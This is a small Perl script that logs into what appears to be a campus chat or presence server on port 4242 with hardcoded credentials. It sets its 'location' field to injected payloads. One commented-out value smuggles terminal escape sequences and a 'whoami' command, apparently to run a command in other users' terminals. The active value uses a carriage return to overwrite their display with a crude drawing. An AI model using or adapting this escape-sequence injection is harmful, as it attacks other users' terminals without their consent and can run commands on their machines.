#!/usr/bin/perl

use     Digest::MD5     qw(md5_hex);
use     IO::Socket;

$login = 'touron_m';
$pass = 'password';

$location = '-';
#$location = '%1BP%24q%0Awhoami%0A%1B%5C';
$location = '%0D8%3D%3DD%20%20%20%20';

$status = 'actif';

$peer = "163.5.255.5";
while (1)
{
    if ($sd = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $peer, PeerPort => 4242, Timeout => 3))
    {
	$toto = <$sd>;
	print "<<< $toto\n";
	($a,$b,$c,$d,$e,$f) = split(/ /, $toto);
	$send = "auth_ag ext_user none -\n"; print ">>> $send"; print $sd $send;
	$send = sprintf("ext_user_log %s %s %s -\n", $login, (md5_hex sprintf("%s-%s/%s%s", $c, $d, $e, $pass)), $location); print ">>> $send"; print $sd $send;
	$send = sprintf("user_cmd state actif:%d\n", $f + 10); print ">>> $send"; print $sd $send;
	print "toto";
	while (1){print "<<< " + <$sd> + "\n";print $sd "PING\n";sleep 1;}
    }
    print "connection error\n";
    $peer = "10.42.1.59";
    sleep 3;
}
